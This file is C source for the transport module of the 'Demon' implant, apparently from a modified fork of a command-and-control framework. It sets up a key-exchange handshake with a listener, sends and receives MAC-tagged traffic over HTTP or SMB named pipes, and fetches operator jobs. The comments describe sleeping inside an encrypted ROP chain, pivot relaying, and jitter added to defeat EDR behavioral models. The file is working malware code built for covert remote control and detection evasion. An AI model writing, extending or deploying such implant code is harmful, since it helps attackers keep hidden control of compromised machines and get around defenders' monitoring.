#include <Demon.h>

#include <common/Macros.h>

#include <core/Package.h>
#include <core/Transport.h>
#include <core/MiniStd.h>
#include <core/Win32.h>
#include <core/TransportHttp.h>
#include <core/TransportSmb.h>
#include <core/TransportKex.h>

BOOL TransportInit( )
{
    PUTS_DONT_SEND( "Connecting to listener (KEX first)" )
    
#ifdef DEBUG
    PRINTF( "[DEBUG::TransportInit] Using magic value: 0x%08x\n", DEMON_MAGIC_VALUE );
#endif

    PVOID  Data    = NULL;
    SIZE_T Size    = 0;
    BOOL   Success = FALSE;

    /* New handshake replaces legacy metadata exchange:
     * 1) Send AgentHello (Ea, nonce_a, mac_a)
     * 2) Receive ServerHello (Es, nonce_s, mac_s)
     * 3) Derive keys (aes key/iv + mac key) and set Connected
     */

#ifdef TRANSPORT_HTTP
    if ( HttpKex(&Data, &Size) )
            {
                Success = TRUE;
        // After KEX, send metadata encrypted with derived keys
        PackageTransmitNow( Instance->MetaData, &Data, &Size );
    }
#endif

#ifdef TRANSPORT_SMB
    if ( SmbKex() == TRUE )
    {
        Success = TRUE;
        // After KEX, send metadata encrypted with derived keys
        PackageTransmitNow( Instance->MetaData, NULL, NULL );
    }
#endif

    return Success;
}

BOOL TransportSend( LPVOID Data, SIZE_T Size, PVOID* RecvData, PSIZE_T RecvSize )
{
    BUFFER Send = { 0 };
    BUFFER Resp = { 0 };
    BOOL   Result = FALSE;

    // CRITICAL: We must work with a COPY of the buffer, not the original.
    // TransportMacAppend uses LocalReAlloc which frees the old pointer.
    // If we used the original Package->Buffer, it would be freed, but the
    // caller still holds a reference to it and may try to use it (e.g., re-decrypt).
    Send.Buffer = Instance->Win32.LocalAlloc(LPTR, Size);
    if (!Send.Buffer) {
        PUTS_DONT_SEND("[TransportSend] Failed to allocate send buffer copy");
        return FALSE;
    }
    MemCopy(Send.Buffer, Data, Size);
    Send.Length = Size;
    // Append MAC if we have a MacKey
    TransportMacAppend(&Send);

#ifdef TRANSPORT_HTTP

    if ( HttpSend( &Send, &Resp ) )
    {
        TransportMacVerifyAndTrim(&Resp);
        if ( RecvData )
            *RecvData = Resp.Buffer;

        if ( RecvSize )
            *RecvSize = Resp.Length;

        Result = TRUE;
    }

#endif

#ifdef TRANSPORT_SMB

    if ( SmbSend( &Send ) )
    {
        // SMB is fire-and-forget; MAC verify on recv path only
        Result = TRUE;
    }

#endif

    // Free our copy of the send buffer (the original Data remains intact)
    if (Send.Buffer) {
        MemSet(Send.Buffer, 0, Send.Length);
        Instance->Win32.LocalFree(Send.Buffer);
        Send.Buffer = NULL;
    }

    return Result;
}

#ifdef TRANSPORT_SMB

BOOL SMBGetJob( PVOID* RecvData, PSIZE_T RecvSize )
{
    BUFFER Resp = { 0 };

    if ( RecvData )
        *RecvData = NULL;

    if ( RecvSize )
        *RecvSize = 0;

    /*
     * Event-driven wake strategy:
     *
     * SMB agents sleep on the pipe's overlapped I/O event inside the
     * encrypted ROP chain.  They wake INSTANTLY when the parent writes
     * data (kernel completes ReadFile → signals hEvent → WaitForSingle-
     * ObjectEx returns early → ROP chain decrypts and restores RX).
     *
     * Config.Sleeping controls the housekeeping timeout — how often the
     * agent wakes WITHOUT parent data (PivotPush for relay agents, fresh
     * re-encryption key rotation).  Default: 420s (7min).
     * Commands are instant regardless — the pipe event bypasses the wait.
     * Operator can change at runtime via `sleep` command.
     *
     * Jitter randomization breaks the behavioral fingerprint that a
     * process waking at perfect intervals creates for EDR ML models.
     */
    DWORD BaseMs = Instance->Config.Sleeping * 1000;
    DWORD TimeoutMs;

    /* Apply jitter from Config.Jitter (0-100%).
     * JitterRange = (Jitter% * 2) of base → ±Jitter% around the base.
     * E.g. 50% jitter → range is base*[0.5, 1.5]. */
    if ( Instance->Config.Jitter > 0 && BaseMs > 0 )
    {
        DWORD MaxVariation = ( Instance->Config.Jitter * BaseMs ) / 100;
        DWORD Rand = RandomNumber32() % ( MaxVariation * 2 + 1 );
        TimeoutMs = BaseMs - MaxVariation + Rand;
    }
    else
    {
        TimeoutMs = BaseMs;
    }

    /* Floor: never less than 5 seconds (prevents busy-loop if operator sets sleep 0) */
    if ( TimeoutMs < 5000 )
        TimeoutMs = 5000;

    if ( SmbRecv( &Resp, TimeoutMs ) )
    {
        TransportMacVerifyAndTrim(&Resp);
        if ( RecvData )
            *RecvData = Resp.Buffer;

        if ( RecvSize )
            *RecvSize = Resp.Length;

        return TRUE;
    }

    return FALSE;
}

#endif
